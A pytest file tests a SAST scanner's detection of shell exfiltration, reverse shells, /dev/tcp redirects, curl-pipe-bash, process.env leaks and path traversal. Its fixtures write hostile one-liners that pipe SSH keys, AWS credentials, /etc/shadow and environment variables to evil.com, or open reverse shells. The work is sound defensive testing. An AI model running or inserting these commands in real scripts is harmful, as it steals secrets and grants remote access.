"""Tests for scan_sast.py - SAST Vulnerability Scanner."""

import pytest
import scan_sast as scanner


class TestShellPipeExfiltration:
    """Tests for pipe chain exfiltration patterns in .sh files."""

    def test_env_piped_to_curl(self, tmp_path):
        sh = tmp_path / "evil.sh"
        sh.write_text("#!/bin/bash\nenv | curl -X POST -d @- http://evil.com/collect\n")
        findings = _scan_repo(tmp_path)
        assert any("env to network" in f.title for f in findings)

    def test_printenv_piped_to_wget(self, tmp_path):
        sh = tmp_path / "exfil.sh"
        sh.write_text("#!/bin/bash\nprintenv | wget --post-data=- http://evil.com\n")
        findings = _scan_repo(tmp_path)
        assert any("env to network" in f.title for f in findings)

    def test_cat_dotenv_piped_to_nc(self, tmp_path):
        sh = tmp_path / "leak.sh"
        sh.write_text("#!/bin/bash\ncat .env | nc evil.com 4444\n")
        findings = _scan_repo(tmp_path)
        assert any("env to network" in f.title for f in findings)

    def test_cat_ssh_piped_to_socat(self, tmp_path):
        sh = tmp_path / "steal.sh"
        sh.write_text("#!/bin/bash\ncat ~/.ssh | socat - TCP:evil.com:9999\n")
        findings = _scan_repo(tmp_path)
        assert any("env to network" in f.title for f in findings)

    def test_cat_aws_piped_to_curl(self, tmp_path):
        sh = tmp_path / "aws.sh"
        sh.write_text("#!/bin/bash\ncat ~/.aws | curl -d @- http://evil.com\n")
        findings = _scan_repo(tmp_path)
        assert any("env to network" in f.title for f in findings)


class TestSensitiveFilePipeExfiltration:
    """Tests for sensitive file to network pipe patterns."""

    def test_cat_credentials_piped_to_curl(self, tmp_path):
        sh = tmp_path / "creds.sh"
        sh.write_text("#!/bin/bash\ncat /home/user/credentials.json | curl -d @- http://evil.com\n")
        findings = _scan_repo(tmp_path)
        assert any("sensitive file to network" in f.title for f in findings)

    def test_cat_id_rsa_piped_to_wget(self, tmp_path):
        sh = tmp_path / "rsa.sh"
        sh.write_text("#!/bin/bash\ncat ~/.ssh/id_rsa | wget --post-data=- http://evil.com\n")
        findings = _scan_repo(tmp_path)
        assert any("sensitive file to network" in f.title for f in findings)

    def test_cat_shadow_piped_to_nc(self, tmp_path):
        sh = tmp_path / "shadow.sh"
        sh.write_text("#!/bin/bash\ncat /etc/shadow | nc evil.com 5555\n")
        findings = _scan_repo(tmp_path)
        assert any("sensitive file to network" in f.title for f in findings)

    def test_cat_gnupg_piped_to_ncat(self, tmp_path):
        sh = tmp_path / "gpg.sh"
        sh.write_text("#!/bin/bash\ncat ~/.gnupg/secring.gpg | ncat evil.com 6666\n")
        findings = _scan_repo(tmp_path)
        assert any("sensitive file to network" in f.title for f in findings)

    def test_cat_password_file_piped_to_curl(self, tmp_path):
        sh = tmp_path / "passwd.sh"
        sh.write_text("#!/bin/bash\ncat /opt/app/password.txt | curl -d @- http://evil.com\n")
        findings = _scan_repo(tmp_path)
        assert any("sensitive file to network" in f.title for f in findings)

    def test_cat_secret_file_piped_to_wget(self, tmp_path):
        sh = tmp_path / "secret.sh"
        sh.write_text("#!/bin/bash\ncat config/secret.yaml | wget --post-data=- http://evil.com\n")
        findings = _scan_repo(tmp_path)
        assert any("sensitive file to network" in f.title for f in findings)


class TestDevTcpRedirect:
    """Tests for /dev/tcp redirect patterns."""

    def test_redirect_to_dev_tcp(self, tmp_path):
        sh = tmp_path / "tcp.sh"
        sh.write_text("#!/bin/bash\necho $SECRET > /dev/tcp/evil.com/8080\n")
        findings = _scan_repo(tmp_path)
        assert any("Redirect to /dev/tcp" in f.title for f in findings)

    def test_redirect_with_spaces(self, tmp_path):
        sh = tmp_path / "tcp2.sh"
        sh.write_text("#!/bin/bash\ncat /etc/passwd >  /dev/tcp/10.0.0.1/443\n")
        findings = _scan_repo(tmp_path)
        assert any("Redirect to /dev/tcp" in f.title for f in findings)


class TestReverseShell:
    """Tests for reverse shell patterns."""

    def test_bash_reverse_shell(self, tmp_path):
        sh = tmp_path / "revshell.sh"
        sh.write_text("#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
        findings = _scan_repo(tmp_path)
        assert any("Reverse shell" in f.title for f in findings)

    def test_nc_exec_sh(self, tmp_path):
        sh = tmp_path / "nc_rev.sh"
        sh.write_text("#!/bin/bash\nnc -e /bin/sh evil.com 4444\n")
        findings = _scan_repo(tmp_path)
        assert any("Reverse shell" in f.title for f in findings)

    def test_nc_exec_bash(self, tmp_path):
        sh = tmp_path / "nc_bash.sh"
        sh.write_text("#!/bin/bash\nnc --exec /bin/bash evil.com 4444\n")
        findings = _scan_repo(tmp_path)
        assert any("Reverse shell" in f.title for f in findings)


class TestExistingShellPatterns:
    """Verify existing .sh patterns still work."""

    def test_eval_in_shell(self, tmp_path):
        sh = tmp_path / "eval.sh"
        sh.write_text("#!/bin/bash\neval $USER_INPUT\n")
        findings = _scan_repo(tmp_path)
        assert any("Eval in Shell" in f.title for f in findings)

    def test_curl_pipe_bash(self, tmp_path):
        sh = tmp_path / "install.sh"
        sh.write_text("#!/bin/bash\ncurl -s http://example.com/setup | bash\n")
        findings = _scan_repo(tmp_path)
        assert any("Curl Pipe Bash" in f.title for f in findings)


class TestNoFalsePositives:
    """Ensure clean shell scripts don't trigger exfiltration patterns."""

    def test_safe_env_usage(self, tmp_path):
        sh = tmp_path / "safe.sh"
        sh.write_text("#!/bin/bash\nenv | grep PATH\necho $HOME\n")
        findings = _scan_repo(tmp_path)
        exfil = [f for f in findings if f.category == "exfiltration"]
        assert len(exfil) == 0

    def test_safe_curl(self, tmp_path):
        sh = tmp_path / "download.sh"
        sh.write_text("#!/bin/bash\ncurl -o output.tar.gz http://example.com/release.tar.gz\n")
        findings = _scan_repo(tmp_path)
        exfil = [f for f in findings if f.category == "exfiltration"]
        assert len(exfil) == 0

    def test_safe_cat(self, tmp_path):
        sh = tmp_path / "read.sh"
        sh.write_text("#!/bin/bash\ncat README.md | head -10\n")
        findings = _scan_repo(tmp_path)
        exfil = [f for f in findings if f.category == "exfiltration"]
        assert len(exfil) == 0


class TestProcessEnvExposure:
    """Tests for process.env logging and serialization patterns."""

    def test_console_log_process_env(self, tmp_path):
        js = tmp_path / "debug.js"
        js.write_text("console.log(process.env)\n")
        findings = _scan_repo(tmp_path)
        assert any("process.env Logged" in f.title for f in findings)

    def test_console_error_process_env(self, tmp_path):
        js = tmp_path / "error.js"
        js.write_text("console.error(process.env)\n")
        findings = _scan_repo(tmp_path)
        assert any("process.env Logged" in f.title for f in findings)

    def test_json_stringify_process_env(self, tmp_path):
        js = tmp_path / "dump.js"
        js.write_text("const envStr = JSON.stringify(process.env)\n")
        findings = _scan_repo(tmp_path)
        assert any("JSON.stringify" in f.title for f in findings)

    def test_process_env_in_crash_report(self, tmp_path):
        js = tmp_path / "crash.js"
        js.write_text("fs.writeFileSync('crash.log', JSON.stringify(process.env))\n")
        findings = _scan_repo(tmp_path)
        assert any("Crash Report" in f.title or "process.env" in f.title for f in findings)

    def test_no_false_positive_single_env_var(self, tmp_path):
        js = tmp_path / "safe.js"
        js.write_text("console.log(process.env.NODE_ENV)\n")
        findings = _scan_repo(tmp_path)
        assert not any("process.env Logged" in f.title for f in findings)

    def test_typescript_process_env_logged(self, tmp_path):
        ts = tmp_path / "debug.ts"
        ts.write_text("console.log(process.env)\n")
        findings = _scan_repo(tmp_path)
        assert any("process.env Logged" in f.title for f in findings)

    def test_typescript_json_stringify(self, tmp_path):
        ts = tmp_path / "dump.ts"
        ts.write_text("JSON.stringify(process.env)\n")
        findings = _scan_repo(tmp_path)
        assert any("JSON.stringify" in f.title for f in findings)


class TestPathTraversal:
    """Tests for path traversal detection patterns."""

    def test_sendfile_with_req_path(self, tmp_path):
        js = tmp_path / "serve.js"
        js.write_text("app.get('/*', (req, res) => res.sendFile(req.path))\n")
        findings = _scan_repo(tmp_path)
        assert any("Path Traversal" in f.title for f in findings)

    def test_readfile_with_req_params(self, tmp_path):
        js = tmp_path / "read.js"
        js.write_text("fs.readFile(req.params.file, (err, data) => {})\n")
        findings = _scan_repo(tmp_path)
        assert any("Path Traversal" in f.title for f in findings)

    def test_path_join_with_req_query(self, tmp_path):
        js = tmp_path / "join.js"
        js.write_text("const p = path.join(__dirname, req.query.file)\n")
        findings = _scan_repo(tmp_path)
        assert any("Path Traversal" in f.title for f in findings)

    def test_proc_self_environ_access(self, tmp_path):
        js = tmp_path / "proc.js"
        js.write_text("fs.readFileSync('/proc/self/environ')\n")
        findings = _scan_repo(tmp_path)
        assert any("/proc" in f.title or "proc" in f.category for f in findings)

    def test_typescript_path_traversal(self, tmp_path):
        ts = tmp_path / "serve.ts"
        ts.write_text("const file = path.resolve(baseDir, req.params.name)\n")
        findings = _scan_repo(tmp_path)
        assert any("Path Traversal" in f.title for f in findings)

    def test_no_false_positive_static_path(self, tmp_path):
        js = tmp_path / "safe.js"
        js.write_text("const p = path.join(__dirname, 'public', 'index.html')\n")
        findings = _scan_repo(tmp_path)
        assert not any("Path Traversal" in f.title for f in findings)


class TestSeverityAndCategory:
    """Verify severity and category are set correctly on new patterns."""

    def test_all_exfil_patterns_are_critical(self, tmp_path):
        sh = tmp_path / "multi.sh"
        sh.write_text(
            "#!/bin/bash\n"
            "env | curl -d @- http://evil.com\n"
            "cat /etc/shadow | nc evil.com 5555\n"
            "echo x > /dev/tcp/evil.com/80\n"
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
        )
        findings = _scan_repo(tmp_path)
        exfil = [f for f in findings if f.category == "exfiltration"]
        assert len(exfil) >= 4
        assert all(f.severity == "critical" for f in exfil)


def _scan_repo(repo_path):
    import forensics_core as core
    findings = []
    for fp, rp in core.walk_repo(str(repo_path)):
        findings.extend(scanner.scan_file(fp, rp))
    return findings
